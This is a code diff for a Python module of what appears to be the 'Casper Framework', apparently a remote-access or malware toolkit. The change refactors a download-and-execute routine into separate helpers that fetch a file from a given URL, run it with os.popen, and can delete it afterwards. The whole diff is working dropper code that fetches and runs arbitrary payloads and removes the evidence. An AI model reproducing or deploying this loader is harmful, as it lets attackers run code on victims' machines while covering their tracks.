@@ -3,32 +3,43 @@ Part of Casper Framework
 '''
 from includes import *
 
-file = 'tmp.exe'
-
-def download_execute(url):
+def shellexec(file):
 	try:
-		logging.debug('[casper] Downloading file')
-		urllib.urlretrieve(url,file)
-		logging.debug('[casper] Download finished')
-	except Exception as e:
-		logging.debug('[casper] Error during download {}'.format(e))
-		return False
-
-	try:
-		logging.debug('[casper] Starting execution of {}'.format(file))
 		spawn = os.popen(file)
-		fetch = spawn.read()
-		logging.debug('[casper] Execution finished of {}'.format(file))
+		data = spawn.read()
+		return True
 	except Exception as e:
-		logging.debug('[casper] Error during execution of {}'.format(file))
 		return False
 
+def download(url,file):
 	try:
-		logging.debug('[casper] Attempting to remove {}'.format(file))
-		os.remove(file)
-		logging.debug('[casper] Successfully removed {}'.format(file))
+		urllib.urlretrieve(url,file)
+		return True
 	except Exception as e:
-		logging.debug('[casper] Error while removing {}'.format(file))
 		return False
-		
-	return True	
+
+def autodelete(file):
+	try:
+		os.remove(file)
+		return True
+	except Exception as e:
+
+		return False	
+
+def download_execute(url,file,autod):
+	if (download(url,file) == True):
+		logging.debug("[casper] Successfully downloaded file!")
+		if (shellexec(file) == True):
+			logging.debug("[casper] Successfully executed file!")
+			if (autod == 1):
+				if (autodelete(file) == True):
+					logging.debug("[casper] Successfully deleted the file!")
+				else:
+					logging.debug("[casper] Unable to delete the file...")
+			else:
+				pass
+		else:
+			logging.debug("[casper] Unable to execute file...")
+	else:
+		logging.debug("[casper] Unable to download file...")
+	return True
